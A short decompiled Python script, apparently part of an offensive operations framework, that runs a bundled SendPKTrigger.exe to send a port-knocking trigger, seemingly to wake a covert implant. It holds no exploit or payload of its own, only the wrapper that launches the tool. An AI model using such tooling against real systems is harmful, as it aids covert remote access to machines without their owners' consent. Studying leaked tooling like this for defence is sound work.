# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: _Knock.py
import dsz
import dsz.lp
import dsz.version
import sys

def main():
    resDir = dsz.lp.GetResourcesDirectory()
    ver = dsz.version.Info(dsz.script.Env['local_address'])
    toolLoc = resDir + 'Pc\\Tools\\%s-%s\\SendPKTrigger.exe' % (ver.compiledArch, ver.os)
    dsz.control.echo.On()
    if not dsz.cmd.Run('local run -command "%s %s" -redirect -noinput' % (toolLoc, ' '.join(sys.argv[1:]))):
        dsz.ui.Echo('* Failed to send port knocking trigger', dsz.ERROR)
    dsz.control.echo.Off()
    return True


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)